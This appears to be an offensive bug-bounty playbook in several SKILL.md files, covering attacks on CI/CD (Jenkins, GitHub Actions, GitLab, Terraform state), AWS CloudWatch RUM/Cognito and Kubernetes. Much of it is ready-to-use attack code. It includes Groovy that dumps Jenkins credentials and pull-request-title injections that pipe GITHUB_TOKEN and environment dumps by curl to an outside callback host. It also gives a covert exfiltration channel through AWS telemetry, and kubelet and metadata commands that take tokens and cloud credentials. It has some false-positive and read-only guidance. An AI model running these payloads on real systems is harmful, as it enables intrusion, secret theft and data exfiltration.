- **GitHub Actions `pull_request_target` injection (Pwnrequest)** — fork PR controls `${{ }}` inside a privileged shell step → exfil `GITHUB_TOKEN` (often `contents:write`) and org secrets
- **Self-hosted runner poisoning** — non-ephemeral runner on a public repo executes a fork PR's build → attacker code runs on the runner host → persistence + secret theft
- **OIDC trust-policy abuse** — over-broad `sub` claim wildcard in an AWS IAM role trust policy → any workflow in the org assumes a privileged cloud role
- **Terraform state leakage** — `*.tfstate` in public S3/GCS/Blob → plaintext infra creds, DB passwords, private keys
- **Runner token / artifact / log leakage** — register attacker runner, or harvest secrets printed before `::add-mask::`

---

## "It-Didn't-Happen-Without-Proof" Gate (Read First)

CI/CD findings are over-reported because dashboards *look* exploitable. Before claiming anything:

1. **A login page is not an RCE.** A reachable `/script` URL that returns a Jenkins login or `403` is **not** an unauthenticated script console. Only an actual `scriptText` POST returning your command's output counts.
2. **A `pull_request_target` workflow is not automatically injectable.** It is only exploitable if untrusted data flows into an execution sink. Confirm the data flow (see FP section) before you ever open a PR.
3. **Blind injection requires OOB.** If the vulnerable step has no output you can read, you MUST confirm via Burp Collaborator / interactsh — a unique per-sink subdomain that the runner calls out to. A workflow that "ran green" is not proof your code executed.
4. **A `.tfstate` HTTP 200 is not cred exposure until you parse it.** Diff against a baseline (see FP section) — many `tfstate` files contain only resource IDs and outputs, no secrets.

---

# Fingerprint — the X-Jenkins header leaks the exact version (drives CVE selection)
curl -sI "https://$TARGET/" | grep -iE "x-jenkins|x-hudson"
curl -sI "https://$TARGET/login" | grep -i "x-jenkins-session"
for p in /script /jenkins/script /ci/script /scriptText /jenkins/scriptText; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$p")
  echo "$p -> $code"   # 200 on /script == anon script console; 403/401 == auth required (NOT a finding alone)
done
```

**Unauthenticated script console → RCE (only if the POST returns output):**
```bash

# Crowd/SSO error page, the console is NOT anon-accessible — do not report it.
curl -s -X POST "https://$TARGET/scriptText" \
  --data-urlencode 'script=println "id".execute().text'
```

**Dump the credential store** (Groovy decrypts secrets the UI masks):
```groovy
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials
import org.jenkinsci.plugins.plaincredentials.StringCredentials
CredentialsProvider.lookupCredentials(StandardUsernamePasswordCredentials, jenkins.model.Jenkins.instance).each {
  println "${it.id} :: ${it.username} :: ${it.password}"
}
CredentialsProvider.lookupCredentials(StringCredentials, jenkins.model.Jenkins.instance).each {
  println "${it.id} :: ${it.secret}"
}
```

**CVE-2024-23897 — pre-auth arbitrary file read via Jenkins CLI** (args4j `@`-file expansion; affects ≤2.441 / LTS ≤2.426.2). With anonymous read, this escalates to RCE by reading `secret.key` + `master.key` to decrypt `credentials.xml`, or reading a user's `config.xml` API token:
```bash

# Download the matching jenkins-cli.jar from /jnlpJars/jenkins-cli.jar first.
java -jar jenkins-cli.jar -s "https://$TARGET/" -http connect-node "@/etc/passwd"

#   @/var/lib/jenkins/credentials.xml
```
Validation: the response must contain real file content (root:x:0:0). A generic "no such agent" with no leaked line means the instance is patched or the path is wrong — not a finding.

---

## Phase 2 — GitHub Actions: Pwnrequest, `${{ }}`-into-Shell, Runner Poisoning, OIDC

### The core distinction (this is where 90% of false PoCs die)

There are **two** sink classes — they need different payloads:

- **`${{ }}` template expansion into a shell `run:`** — the expression is substituted into the script *before* the shell runs, so a newline/backtick/`$(...)` in the untrusted field becomes literal shell. This is the classic injection.
- **Environment variable read inside the shell** — `GITHUB_TOKEN`, `secrets.X`, and any `env:`-mapped value are **shell variables whose value IS the string**. To exfiltrate them you use `echo`/`printenv`, **never** `cat $VAR` (that tries to open a file *named* by the token and prints nothing).

```yaml

# VULNERABLE workflow (untrusted title flows into the script text):
on: pull_request_target            # runs with write token + secrets, on fork PRs
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with: { ref: ${{ github.event.pull_request.head.sha }} }   # checks out ATTACKER code
      - run: echo "Building PR ${{ github.event.pull_request.title }}"   # ← ${{ }} INJECTION
```

**Attack via the `${{ }}` sink** — set the PR **title** (or branch name, body, label, commit message — all attacker-controlled) to break out of the echo and run your own commands. Exfiltrate the token with `printenv`, not `cat`:
```
PR title:  a"; printenv GITHUB_TOKEN | base64 | tr -d '\n' | { read T; curl "https://x.<COLLAB>/?t=$T"; }; echo "
```
For a multi-line YAML `run:`, a newline injection is cleaner:
```
PR title:  foo\n      curl https://x.<COLLAB>/?d=$(printenv | base64 -w0)
```

**Attack via a poisoned checkout (no `${{ }}` needed)** — if `pull_request_target` checks out the PR head and then runs a build script / installs deps from the checked-out tree (`make`, `npm ci` with a malicious `preinstall`, a Makefile, a `.github/` action in the PR), the *runner executes attacker code directly*. Drop into any build hook:
```bash

# in attacker's PR, e.g. package.json preinstall or Makefile:
curl -s "https://x.<COLLAB>/?env=$(printenv | base64 -w0)"
cat /proc/self/environ | tr '\0' '\n' | base64 -w0   # captures secrets injected as env
```

**Self-hosted runner poisoning** — if `runs-on: self-hosted` (or a custom label) on a **public** repo with `pull_request`/`pull_request_target`, a fork PR's job runs on the org's own host. Non-ephemeral runners persist tools/creds between jobs. Confirm by reading the runner's identity and metadata from inside the job:
```bash
- run: |
    whoami; hostname; id
    curl -s "https://x.<COLLAB>/?h=$(hostname)&u=$(whoami)"
    curl -s "https://x.<COLLAB>/imds=$(curl -s --max-time 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 -w0)"
```

**OIDC trust-policy abuse** — workflows that `configure-aws-credentials` via OIDC assume an IAM role. A trust policy whose `token.actions.githubusercontent.com:sub` condition is missing or uses a loose wildcard (`repo:ORG/*:*`) lets **any** workflow in the org (including a malicious one you can merge, or a fork on a misconfigured trigger) assume that role. Inspect the role:
```bash
aws iam get-role --role-name <RoleName> --query 'Role.AssumeRolePolicyDocument'

# Red flag: StringLike on sub with "repo:ORG/*" or no sub condition at all (only aud).
```
Then prove it: from a workflow you control in-org, assume the role and run `aws sts get-caller-identity` returning the privileged role ARN.

# Enumerate org workflows that use the dangerous triggers
gh api graphql -f query='{organization(login:"ORG"){repositories(first:100){nodes{name}}}}' \
  | jq -r '.data.organization.repositories.nodes[].name' | while read r; do
  for wf in $(gh api "repos/ORG/$r/contents/.github/workflows" 2>/dev/null | jq -r '.[]?.name'); do
    body=$(gh api "repos/ORG/$r/contents/.github/workflows/$wf" 2>/dev/null | jq -r '.content' | base64 -d)
    echo "$body" | grep -Eq 'pull_request_target|workflow_run' && \
      echo "$body" | grep -Eq '\$\{\{ *github\.event|self-hosted|head\.ref|head\.sha' && \
      echo "CANDIDATE: ORG/$r/$wf"
  done
done
```
Triage candidates with the static analyzer before opening any PR: `gh extension install rhysd/actionlint` or run **zizmor** (`pip install zizmor; zizmor .github/workflows/`) which flags template-injection and dangerous-checkout patterns specifically.

---

### Actions cache poisoning
The GitHub Actions cache is not trust-isolated across branches by default: a workflow from an attacker branch/fork PR can write a cache entry (key or restore-key) that a later privileged workflow on the default branch restores, injecting attacker files (built binaries, deps, scripts) into a trusted build -> code execution in the privileged context. Check for cache actions keyed on attacker-influenced values, and whether privileged pipelines `restore-keys` a prefix an untrusted job can populate.

# Public-repo run logs frequently contain secrets printed BEFORE ::add-mask:: took effect,

# or echoed via debug. The masker only hides exact known values — derived/base64 forms slip through.
gh api "repos/ORG/REPO/actions/runs" | jq -r '.workflow_runs[:20][].id' | while read id; do
  gh api "repos/ORG/REPO/actions/runs/$id/logs" > /tmp/r.zip 2>/dev/null && \
  unzip -o -q /tmp/r.zip -d /tmp/runlogs && \
  grep -rniE 'AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|-----BEGIN|eyJ[A-Za-z0-9_-]{10,}\.' /tmp/runlogs
done

# Artifacts — env dumps, .env, kubeconfig, built binaries with embedded secrets
gh api "repos/ORG/REPO/actions/artifacts" | jq -r '.artifacts[] | "\(.id) \(.name)"'
```
Note `actions/upload-artifact` does **not** redact secrets — an artifact named `env`/`debug` is a common direct leak.

---

# Runner registration token → register an attacker runner that picks up jobs (and their secrets).

# Found in config.toml (via LFI/disclosure), screenshots, /admin/runners, or leaked CI logs.
curl -s "https://$TARGET/api/v4/projects/PID/variables" -H "PRIVATE-TOKEN: $TOK"   # masked? protected?
curl -s "https://$TARGET/api/v4/runners?type=instance_type" -H "PRIVATE-TOKEN: $TOK"

# `rules:` that run privileged jobs on MRs from forks (the GitLab analogue of pull_request_target).
curl -s "https://$TARGET/api/v4/projects/PID/repository/files/.gitlab-ci.yml/raw?ref=main"
```
A registration token alone is **not** a finding unless the instance allows that token to register a runner that will execute a target project's pipeline. Demonstrate by registering an ephemeral runner you own and capturing a job's masked variables.

---

# Probe common public-bucket/path patterns (parameterize $T and $ORG)
for U in \
  "https://$ORG.s3.amazonaws.com/terraform.tfstate" \
  "https://s3.amazonaws.com/$ORG-tfstate/terraform.tfstate" \
  "https://$ORG-infra.s3.amazonaws.com/env/prod/terraform.tfstate" \
  "https://storage.googleapis.com/$ORG-tfstate/default.tfstate" \
  "https://$ORG.blob.core.windows.net/tfstate/terraform.tfstate" ; do
  code=$(curl -s -o /tmp/tf.json -w "%{http_code}" "$U")
  [ "$code" = "200" ] && echo "[+] 200 $U" && \
    jq -r '.resources[].instances[].attributes
           | to_entries[] | select(.key|test("password|secret|private_key|token|access_key";"i"))
           | "\(.key) = \(.value)"' /tmp/tf.json 2>/dev/null
done

# Also hunt state in repos / backend configs
gh search code --owner ORG "terraform.tfstate" --limit 10
gh search code --owner ORG 'backend "s3"' --limit 10
```
**False-positive filter:** a `tfstate` that lists only `id`, `arn`, `tags` is not a secret leak. Run the `jq` above and confirm at least one *live* credential (a real `password`, `private_key`, RDS master password, or non-rotated access key). Then prove impact by using that credential read-only (`aws sts get-caller-identity`, a DB connect that returns a banner) — do not just claim "creds in state."

---

## Phase 6 — Build Artifact / Image Analysis

```bash
docker pull ORG/IMAGE:latest
docker history --no-trunc ORG/IMAGE:latest | grep -iE 'ENV|ARG|secret|token|password|key'

# Layer-level scan catches secrets removed in a later layer but still present in history:
trufflehog docker --image ORG/IMAGE:latest --only-verified
```
`--only-verified` filters trufflehog to credentials it could actually authenticate — use it to drop the noise of expired/example keys before reporting.

---

## Grounded References (named cases / CVEs)

- **Pwnrequest / `pull_request_target` class** — GitHub Security Lab (Jaroslav Lobačevski), "Keeping your GitHub Actions and workflows secure: Untrusted input." The original write-up of fork-PR secret exfil and the dangerous-checkout pattern.
- **GitHub Actions workflow-command injection — CVE-2020-15228** — `set-env`/`add-path` workflow commands allowed env/PATH injection from logged output; this drove the deprecation of those commands and the move to `$GITHUB_ENV`.
- **Jenkins CLI arbitrary file read — CVE-2024-23897** — args4j `@`-prefixed file expansion (Jenkins ≤2.441 / LTS ≤2.426.2), read `secret.key`/`credentials.xml` → admin → RCE.
- **Jenkins Stapler RCE — CVE-2018-1000861** — dynamic routing reaches `groovy.lang.GroovyShell`; a staple of the unauth script-execution chain on older Jenkins.
- **PortSwigger / Liam Galvin & others** — research on GitHub Actions injection sinks (title/branch/body/label) and the `${{ }}`-into-`run` template-substitution vector; the basis of the actionlint/zizmor detection rules cited above.

(Only CVEs and cases I can attribute exactly are listed. Confirm the running version against the CVE's affected range before claiming it.)

---

## Chain Table

| CI/CD finding | Chain to | Impact |
|---|---|---|
| Jenkins anon script console | Dump credential store → cloud/DB creds → lateral | Critical |
| Jenkins CLI file read (CVE-2024-23897) | Read `secret.key`+`credentials.xml` → forge admin → RCE | Critical |
| Actions `${{ }}` injection (Pwnrequest) | `printenv GITHUB_TOKEN`/secrets → push to protected branch | Critical |
| Self-hosted runner poisoning | Code-exec on runner host → IMDS creds → persistence | Critical |
| OIDC `sub` wildcard | `AssumeRole` privileged cloud role from any org workflow | Critical |
| Terraform state w/ live creds | Infra/DB/API credential use | Critical |
| GitLab runner registration | Register runner → capture pipeline secrets | High/Critical |
| Image/log/artifact secret | Direct credential use | High |

---

## Validation Discipline (per finding, before you report)

- **Jenkins console:** the `scriptText` POST returns your `id` output (`uid=…(jenkins)`). A returned login/SSO/Crowd page = **not** anon access. Screenshot the request+response.
- **CVE-2024-23897:** response contains real `/etc/passwd` content; confirm version is in range. Patched instances return an error with no leaked line.
- **Actions injection:** confirm the data flow into a sink first (FP section). Blind step → **Collaborator callback with the runner's source IP** is mandatory. Token exfil via `printenv`/`/proc/self/environ` decoded at your endpoint — never `cat $GITHUB_TOKEN`.
- **OIDC abuse:** `aws sts get-caller-identity` from your controlled workflow returns the privileged role ARN — not just a permissive-looking trust policy.
- **Terraform state:** `jq` extraction yields ≥1 *live* secret, then a read-only auth proves it. ID/ARN-only state = no finding.
- **Runner token / image / logs:** demonstrate the secret authenticates (trufflehog `--only-verified`, or a real API call) — possession of a string is not impact.

### Common false positives to retract
- `/script` returning a login page (auth required) reported as "unauth RCE."
- `pull_request_target` present but untrusted input never reaches a sink (e.g., used only in `if:` on `github.actor`, or the workflow uses `pull_request` not `_target`).
- `${{ }}` reference that is already wrapped in an `env:` block and quoted in the shell (the recommended safe pattern) — not injectable.
- `.tfstate` 200 containing only resource metadata.
- A masked GitLab variable that is `protected` and only exposed to protected branches the attacker can't push to.
- Trufflehog "unverified" hits that are example/expired keys.

**Severity:** Jenkins console / CVE-2024-23897 / Actions secret exfil / runner poisoning / OIDC role assumption / Terraform live creds = **Critical**. Image/log/artifact secret = **High/Critical** by credential scope.


## SOURCE: hunt-skills/hunt-cloud-misconfig/SKILL.md

### Jenkins SSO-restriction failure → Script Console RCE
An exposed Jenkins that authenticates ANY personal Google/OAuth account (missing org-domain restriction) is full compromise: log in, then `/script` (Groovy console) = RCE, and `/credentials` + `/scriptText` = stored API tokens and source disclosure. Disclosed: reports/231460.

### Exposed message broker (RabbitMQ / AMQP) with default creds
Probe RabbitMQ management (`http://TARGET:15672/`, API `:15672/api/overview`) and AMQP `:5672`; try default `guest:guest` (works off-localhost when `loopback_users` is misconfigured) → queue/message read, vhost enumeration, management-plugin admin. Disclosed: reports/753602.

## Local-verification toolchain

For testing cloud-misconfig findings against a local AWS sim before/instead of hitting real cloud:

```bash

# LocalStack 3.0 community (pin the version — 4.x requires a Pro license)
docker run -d --name lab-localstack -p 14566:4566 localstack/localstack:3.0

# awscli ≥ 2.30 + LocalStack 3.0 incompatibility workaround (x-amz-trailer header):
export AWS_REQUEST_CHECKSUM_CALCULATION=when_required
export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required
export AWS_ENDPOINT_URL=http://localhost:14566
export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1
```

Without those env vars, `aws s3 cp/sync` fails with `InvalidRequest`. Document this for the team. See `docs/verification/phase2j-cloud-localstack.md` for the full reproducible flow.

---

## CloudWatch RUM Weaponization (2024-2026 surface)

AWS CloudWatch RUM (Real-User Monitoring) is a client-side telemetry service launched late 2021. Customers embed a JS snippet on their pages that sends performance/error events to `dataplane.rum.<region>.amazonaws.com`. The snippet's `AppMonitor` config contains an `identityPoolId` (Cognito) and `guestRoleArn` (IAM role) — both **public by design**. The IAM role policy is the security boundary, and when developers leave it broader than the documented minimum (`rum:PutRumEvents` on the AppMonitor ARN), the entire pool becomes the unauthenticated AWS-credential vending machine described in `cloud-iam-deep` → Cognito Identity Pool chain.

### Detection — JS bundle fingerprints

**Snippet-style (most common, embedded in `<head>`):**
```javascript
(function(n,i,v,r,s,c,x,z){...})(
  'cwr',
  '00000000-0000-0000-0000-000000000000',                       // applicationId (UUID)
  '1.0.0',
  'us-east-1',
  'https://client.rum.us-east-1.amazonaws.com/1.x/cwr.js',
  {
    sessionSampleRate: 1,
    guestRoleArn: "arn:aws:iam::123456789012:role/RUM-Monitor-...-Unauth",
    identityPoolId: "us-east-1:abcd1234-...",
    endpoint: "https://dataplane.rum.us-east-1.amazonaws.com",
    telemetries: ["errors","performance","http"]
  }
);
```

**NPM-style (aws-rum-web package):**
```javascript
import { AwsRum, AwsRumConfig } from 'aws-rum-web';
const config: AwsRumConfig = { identityPoolId, endpoint, guestRoleArn, ... };
const awsRum = new AwsRum(APPLICATION_ID, '1.0.0', AWS_REGION, config);
```

# Detect RUM init
grep -REn "cwr\(['\"]init['\"]|from\s+['\"]aws-rum-web['\"]|new\s+AwsRum\(" .

# Extract applicationId (UUID v4)
grep -ErohE "applicationId['\"]?\s*[:=]\s*['\"]([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})['\"]" .

# Extract identityPoolId (region:UUID)
grep -ErohE "identityPoolId['\"]?\s*[:=]\s*['\"]([a-z]{2}-[a-z]+-[0-9]+:[0-9a-f-]{36})['\"]" .

# Extract guestRoleArn (leaks AWS account ID + role name)
grep -ErohE "guestRoleArn['\"]?\s*[:=]\s*['\"]arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9._/-]+['\"]" .

# Endpoint reveals region
grep -ErohE "dataplane\.rum\.[a-z0-9-]+\.amazonaws\.com" .
```

### Attack chains

**Chain A — Credential extraction (Critical when guestRole is over-permissioned).** Once `identityPoolId` is extracted from the page, anyone runs:

```bash
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:abcd1234-..." \
  --region us-east-1 --no-sign-request
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:<returned-uuid>" \
  --region us-east-1 --no-sign-request

# → STS creds; export and:
aws sts get-caller-identity        # confirm role
aws s3 ls; aws dynamodb list-tables; aws lambda list-functions; aws ssm describe-parameters; aws secretsmanager list-secrets

# Automate: pacu / enumerate-iam.py
```

Full chain documented in `cloud-iam-deep` → Cognito Identity Pool unauthenticated chain. RUM is one common embedding context.

**Chain B — Telemetry endpoint covert exfil.** `dataplane.rum.<region>.amazonaws.com` is an **AWS-owned domain on every enterprise allowlist**. The `PutRumEvents` payload accepts arbitrary `userDetails` and `customEvents` string fields:

```bash
aws rum put-rum-events \
  --id $(uuidgen) \
  --app-monitor-details '{"id":"<appId>","version":"1.0.0"}' \
  --user-details '{"userId":"EXFIL_PAYLOAD_HERE","sessionId":"<session>"}' \
  --rum-events '[{"id":"'$(uuidgen)'","timestamp":'$(date +%s)',"type":"com.amazon.rum.custom_event","details":"{\"exfil\":\"<base64 of stolen data>\"}"}]' \
  --endpoint-url "https://dataplane.rum.us-east-1.amazonaws.com" \
  --region us-east-1
```

Defenders watching egress see traffic to a known-good AWS hostname; DLP doesn't parse the JSON body; SIEM rules typically don't ingest customer RUM telemetry.

**Chain C — DOM injection via snippet source poisoning.** Many customers either self-host `cwr.js` on their own CDN (`assets.target.com/cwr.js`) or bundle `aws-rum-web` and serve from `static.target.com/main.<hash>.js`. Subdomain takeover on the JS host or supply-chain compromise (npm typosquat against `aws-rum-webb`) gives persistent JS execution on every page-load with the trust of the `aws-rum-web` SDK — including its already-granted Cognito permissions.

**Chain D — Telemetry injection / dashboard poisoning.** With the public `identityPoolId` + `applicationId`, an external attacker can flood `PutRumEvents` with fake error spikes (drown real alerts), inject XSS payloads into page-URL telemetry that fire when an SOC analyst views the CloudWatch dashboard, and inflate billable RUM event counts (financial DoS).

### Severity rubric

| Finding | Severity | Justification |
|---|---|---|
| `guestRoleArn` with `*:*` or wildcards on multiple services | **Critical** (9.1+) | Anonymous full AWS access |
| `guestRoleArn` with `s3:*`, `dynamodb:*`, `secretsmanager:*`, `lambda:Invoke*` on production resources | **High** (7.5-8.8) | Data exfil / RCE depending on resource |
| `guestRoleArn` with `cognito-identity:*` or `iam:PassRole` | **High** (8.0) | Privilege escalation primitive |
| `guestRoleArn` with only `rum:PutRumEvents` + endpoint-scoped resource | **Informational** | Documented, intended config |
| RUM `userDetails` logging PII into events viewable in CloudWatch console | **Medium** (5.3-6.5) | Sensitive data exposure via dashboard sharing |
| RUM AppMonitor accepts `PutRumEvents` from arbitrary internet sources (telemetry injection) | **Low-Medium** (4.3) | Dashboard poisoning, alert evasion, billing DoS |
| Self-hosted `cwr.js` on takeoverable subdomain | **Critical** (9.8) when chained | Persistent stored XSS across every customer page |

### Disclosed cases / authoritative writeups

No CVE assigned specifically to AWS RUM as of 2026-05. The attack class is documented in research but specific named bug-bounty payouts on RUM are rare in public hacktivity. The pattern is "Cognito identity pool over-permission via embedded SDK" — RUM is one common embedding.

- **Andres Riancho — "Misconfigured Cognito Identity Pools" (2020/2023)** — establishes the attack class. [andresriancho.com](https://andresriancho.com/identity-pools-and-the-default-iam-role-trap/)
- **Rhino Security Labs — Pacu `cognito__enum_identity_pools`** — production tooling that automates Chain A. [github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)
- **NotSoSecure / Claranet — "Exploiting weak configurations in Amazon Cognito" (Nov 2023)** — explicitly calls out RUM as one of three SDKs commonly leaking the pool ID. [notsosecure.com](https://www.notsosecure.com/exploiting-weak-configurations-in-amazon-cognito/)
- **HackTricks Cloud — `aws-cognito-unauthenticated-enum`** — canonical playbook. [cloud.hacktricks.wiki](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html)
- **Datadog Security Labs — "Following AWS Logs Backwards: Cognito Identity Pool Abuse" (2024)** — telemetry showing real-world abuse rates. [securitylabs.datadoghq.com](https://securitylabs.datadoghq.com/articles/abusing-aws-cognito-misconfigurations/)
- **aws-observability/aws-rum-web GitHub issues #213, #404** — community discussion of the bundled-snippet security model. [github.com/aws-observability/aws-rum-web](https://github.com/aws-observability/aws-rum-web/issues)

### Validation checklist (before reporting)

1. Extract `identityPoolId` from page source.
2. Confirm pool allows unauth identities (`get-id` succeeds without auth).
3. Confirm `get-credentials-for-identity` returns STS creds.
4. Run `aws sts get-caller-identity` and **screenshot the role ARN**.
5. Run `enumerate-iam` / Pacu `iam__enum_permissions` — capture **at least one allowed action beyond `rum:PutRumEvents`**. Without this, the finding is Informational.
6. Demonstrate at least one read/list against a real resource (S3 bucket list, DynamoDB scan, Lambda invoke).
7. **Do not** modify/delete data even if permitted — read-only PoC only.

---

## Related Skills & Chains

- **`hunt-subdomain`** — Stale CNAMEs pointing to deleted buckets are a takeover gold mine. Chain primitive: Cloud misconfig (S3 public/deleted) + `hunt-subdomain` → unclaimed CNAME points to bucket → `assets.target.com` takeover.
- **`cloud-iam-deep`** — A leaked SA JSON / AWS key in a public bucket is only half the bug. Chain primitive: Public S3 + leaked AWS key in `.env` → `cloud-iam-deep` enumeration → cross-service `iam:PassRole` escalation.
- **`hunt-ssrf`** — Metadata service is reachable only from inside the VPC; SSRF is the bridge. Chain primitive: SSRF + cloud misconfig (IMDSv1 still enabled) → instance role keys → S3/RDS data read.
- **`supply-chain-attack-recon`** — Exposed CI/CD endpoints and SBOMs reveal internal package names. Chain primitive: Exposed Jenkins/GitLab + internal package name leak → npm/PyPI dependency-confusion publish → CI build pwn.
- **`security-arsenal`** — Load the Cloud Bucket Wordlist (target-prod / target-backup / target-staging permutations) and the Admin-Panel Path List for fast enumeration.
- **`triage-validation`** — Apply the Unique-Marker gate: any "writable bucket" claim requires a write of a unique marker file and a read-back from a clean session before report submission.


## SOURCE: hunt-skills/hunt-k8s/SKILL.md

## Crown Jewel Targets

K8s API anonymous cluster-admin = full cluster control. docker.sock + RCE = host root. A single privileged-pod create or a kubelet `/run` shell pivots one finding to total compromise.

**Highest-value findings:**
- **K8s API anonymous cluster-admin** — `system:anonymous`/`system:unauthenticated` bound to a powerful role (classic misconfig: `system:anonymous` in a `ClusterRoleBinding` to `cluster-admin`) → full `kubectl`. Mere anonymous `200` is NOT this (see false-positive section).
- **Kubelet `10250` exec/run** — `/run` returns command output directly; `/exec` is a SPDY/WebSocket stream (see Phase 3). Either → RCE in any pod → steal that pod's SA token.
- **API-server-mediated kubelet RCE** — `/api/v1/nodes/<node>/proxy/run/...` reaches the kubelet *through* the API server using your (low-priv) token; if RBAC grants `nodes/proxy`, you get pod RCE without touching 10250 directly. Primary 2024-2026 vector.
- **etcd `2379` unauth** — every Secret (SA tokens, TLS keys, app creds) stored, often plaintext (unless `EncryptionConfiguration` is set) → full credential dump.
- **docker.sock exposure** — SSRF/LFI/RCE reaching `/var/run/docker.sock` → create `--privileged` container, bind-mount host `/` → host root.
- **Container escape via runc** — Leaky Vessels (CVE-2024-21626): `WORKDIR`/`process.cwd` pointing at a leaked `/proc/self/fd/<n>` host FD → break out of an attacker-controlled image/exec to host root.
- **SA token abuse** — auto-mounted token at `/var/run/secrets/kubernetes.io/serviceaccount/token`; check its real grants with SelfSubjectRulesReview before claiming impact.
- **K8s Dashboard skip-login / token-less API** — full cluster management UI reachable unauthenticated.

---

## OOB / Confirmation Gate (Read First)

K8s findings are RCE/credential-disclosure class. House rule: **prove state change or data read, never infer from a status code.**

- A `200` on `/api/v1/namespaces` does **not** mean cluster-admin. The API server returns `200` with an RBAC-filtered (often empty `items: []`) list to *any* principal that can reach `list namespaces` — anonymous read on a few resources is common and low-impact. Confirm real privilege with **SelfSubjectRulesReview / SelfSubjectAccessReview**, then by actually reading a Secret value.
- **10255 (read-only) vs 10250 (exec)** are constantly conflated. 10255 (HTTP, no auth) is info-disclosure only — it has `/pods`, `/stats`, `/metrics`, NO exec/run. 10250 (HTTPS) is where `/run` and `/exec` live. Do not report "kubelet RCE" off a 10255 hit.
- **Blind/outbound vectors need OOB.** If you exploit SSRF→IMDS→K8s, or a pod's egress, confirm the outbound hop with a Burp Collaborator / interactsh subdomain (e.g. `curl http://<token>.<collab>` from inside the pod via `/run`). A delayed response or an echoed URL is NOT proof.
- **Impact proof = the artifact.** For exec: the literal `id`/`hostname` output. For etcd/Secret: the decoded token bytes (redact in report). For docker.sock escape: the host file content (`/etc/hostname` of the node, distinct from the container's).
- Use a **dedicated test namespace / test pod** when you have create rights; never exec into production workloads to "prove" RCE — list the pod and exec a read-only `id` in a pod you spun up if policy allows, or limit to a single non-destructive `id` and stop.

---

# Common Kubernetes / container ports
PORTS="443,6443,8443,8080,10250,10255,10256,2379,2380,4194,9090,9100,30000-30010"
nmap -sV -p $PORTS $TARGET 2>/dev/null | grep open

# API server fingerprint — the /version endpoint is anonymous on most clusters
curl -sk "https://$TARGET:6443/version"        # {"major":"1","minor":"29","gitVersion":"v1.29.x"...}
curl -sk "https://$TARGET:6443/api"             # APIVersions list, even pre-auth
curl -sk "https://$TARGET:6443/healthz"

# Cloud metadata pivot (reach K8s SA / node creds from an SSRF foothold)
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" # AWS EKS (IMDSv1)
TOK=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60") # IMDSv2
curl -s -H "X-aws-ec2-metadata-token: $TOK" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"      # Azure AKS
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" # GKE
```
Note the `gitVersion` — it gates every CVE below.

---

## Phase 2 — Kubernetes API Anonymous / Low-Priv Access

```bash
SRV="https://$TARGET:6443"

# 1. What am I? (anonymous → "system:anonymous")
curl -sk "$SRV/apis/authentication.k8s.io/v1/selfsubjectreviews" -X POST \
  -H 'Content-Type: application/json' \
  -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}'

# 2. What can I actually DO? (the only honest privilege check)
curl -sk "$SRV/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -X POST \
  -H 'Content-Type: application/json' \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'

# 3. Targeted access check for the crown-jewel verbs
for R in secrets pods nodes/proxy pods/exec; do
  curl -sk "$SRV/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -X POST \
   -H 'Content-Type: application/json' \
   -d "{\"kind\":\"SelfSubjectAccessReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"resourceAttributes\":{\"verb\":\"create\",\"resource\":\"${R%%/*}\",\"subresource\":\"${R#*/}\"}}}" \
   | grep -o '"allowed":[a-z]*' | sed "s#^#$R #"
done

# 4. Only if access review says allowed — read a real Secret to prove impact
curl -sk "$SRV/api/v1/secrets" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get("items",[])),"secrets")'

# echo '<base64>' | base64 -d
```

**CVE-2018-1002105** (`gitVersion` < v1.10.11/1.11.5/1.12.3): API-server proxy upgrade flaw lets an unauthenticated/low-priv user escalate to backend (kubelet/aggregated-API) requests with API-server identity → cluster-admin. Fingerprint `gitVersion` in Phase 1; if vulnerable this is the single highest-impact finding.

---

## Phase 3 — Kubelet (Port 10250) — `/run` First, `/exec` Done Right

The earlier version of this skill sent `/exec` as a plain `POST` and expected `id` output back. **That is wrong.** `/exec` is a SPDY/WebSocket *streaming* endpoint: a plain POST returns a **302 redirect to a stream location** (e.g. `/cri/exec/<token>`) that you then must read with a SPDY/WebSocket client. An operator who runs the old curl sees nothing and wrongly concludes the kubelet is patched.

```bash
SRV="https://$TARGET:10250"

# Enumerate pods (auth varies; many kubelets allow anonymous read here)
curl -sk "$SRV/pods" | python3 -m json.tool 2>/dev/null \
  | grep -E '"namespace"|"name"|"containerName"' | head -40

NS=default; POD=target-pod; CTR=app

# --- PRIMITIVE A: /run — returns command output DIRECTLY (no stream handling) ---

# This is the simple correct primitive. Use this first.
curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=id"
curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# Option 2: raw — the POST returns a 302 to a stream path; -v to see Location, then

